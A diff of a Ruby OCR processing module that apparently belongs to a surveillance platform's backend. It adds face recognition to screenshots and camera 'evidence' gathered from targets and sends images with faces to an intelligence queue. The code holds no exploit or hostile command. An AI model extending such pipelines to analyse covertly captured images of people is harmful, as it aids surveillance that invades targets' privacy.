@@ -6,6 +6,7 @@
 
 require_relative 'leadtools'
 require_relative 'tika'
+require_relative 'facereco'
 
 require 'rcs-common/trace'
 require 'rcs-common/fixnum'
@@ -18,6 +19,12 @@ module OCR
 class Processor
   extend RCS::Tracer
 
+  @@status = 'Starting...'
+
+  def self.status
+    @@status
+  end
+
   def self.run
     trace :info, "OCR ready to go..."
 
@@ -28,13 +35,18 @@ class Processor
       if (queued = OCRQueue.get_queued)
         entry = queued.first
         count = queued.last
+        @@status = "Processing #{count} evidence in queue"
         trace :info, "#{count} evidence to be processed in queue"
         process entry
       else
         #trace :debug, "Nothing to do, waiting..."
+        @@status = 'Idle...'
         sleep 1
       end
     end
+  rescue Interrupt
+    trace :info, "System shutdown. Bye bye!"
+    return 0
   rescue Exception => e
     trace :error, "Thread error: #{e.message}"
     trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
@@ -43,7 +55,7 @@ class Processor
 
 
   def self.process(entry)
-    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
+    ev = Evidence.target(entry['target_id']).find(entry['evidence_id'])
 
     start = Time.now
 
@@ -63,18 +75,49 @@ class Processor
       when 'screenshot'
         # invoke the ocr on the temp file and get the result
         processed = LeadTools.transform(temp, output)
+        update_evidence_data_body(ev, output, processed)
+        # search for faces in screenshots
+        processed = FaceRecognition.detect(temp)
+        update_evidence_data_face(ev, processed) if processed.has_key? :face
       when 'file'
         trace :debug, "Extracting text from: #{File.basename(ev.data['path'])}"
         # invoke the text extractor on the temp file and get the result
         processed = Tika.transform(temp, output)
+        update_evidence_data_body(ev, output, processed)
+      when 'camera'
+        # find if there is a face in the picture
+        processed = FaceRecognition.detect(temp)
+        if processed.has_key? :face
+          update_evidence_data_face(ev, processed)
+          IntelligenceQueue.add(entry['target_id'], ev.id, :evidence)
+        end
     end
 
+    FileUtils.rm_rf temp
+
+    trace :info, "Evidence processed in #{Time.now - start} seconds - #{ev.type} #{size.to_s_bytes}"
+
+    # check if there are matching alerts for this evidence
+    RCS::DB::Alerting.new_evidence(ev)
+
+    # add to the translation queue
+    TransQueue.add(entry['target_id'], ev._id) if LicenseManager.instance.check :translation
+
+  rescue Exception => e
+    trace :error, "Cannot process evidence: #{e.message}"
+    trace :error, e.backtrace.join("\n")
+    FileUtils.rm_rf temp
+    FileUtils.rm_rf output
+    #FileUtils.mv temp, temp + '.jpg'
+    #exit!
+  end
+
+  def self.update_evidence_data_body(ev, output, processed)
     raise "unable to process" unless processed
     raise "output file not found" unless File.exist?(output)
 
-    ocr_text = File.open(output, 'r') {|f| f.read}
+    ocr_text = File.open(output, 'r') { |f| f.read }
 
-    FileUtils.rm_rf temp
     FileUtils.rm_rf output
 
     # take a copy of evidence data (we need to do this to trigger the mongoid save)
@@ -86,27 +129,24 @@ class Processor
     ev[:data] = data
     ev[:kw] += ocr_text.keywords
 
+    trace :info, "Text size is: #{data[:body].size.to_s_bytes}"
+
     ev.save
-
-    trace :info, "Evidence processed in #{Time.now - start} seconds - #{ev.type} #{size.to_s_bytes} -> text #{data[:body].size.to_s_bytes}"
-
-    # check if there are matching alerts for this evidence
-    RCS::DB::Alerting.new_evidence(ev)
-
-    # add to the translation queue
-    if LicenseManager.instance.check :translation
-      TransQueue.add(entry['target_id'], ev._id)
-    end
-
-  rescue Exception => e
-    trace :error, "Cannot process evidence: #{e.message}"
-    trace :error, e.backtrace.join("\n")
-    FileUtils.rm_rf temp
-    FileUtils.rm_rf output
-    #FileUtils.mv temp, temp + '.jpg'
-    #exit!
   end
 
+  def self.update_evidence_data_face(ev, processed)
+    raise "unable to process" unless processed
+
+    # take a copy of evidence data (we need to do this to trigger the mongoid save)
+    data = ev[:data].dup
+    data.merge! processed
+
+    trace :info, "Face recognition output: #{processed.inspect}"
+
+    # update the evidence with the new parameters
+    ev[:data] = data
+    ev.save
+  end
 
 end
 
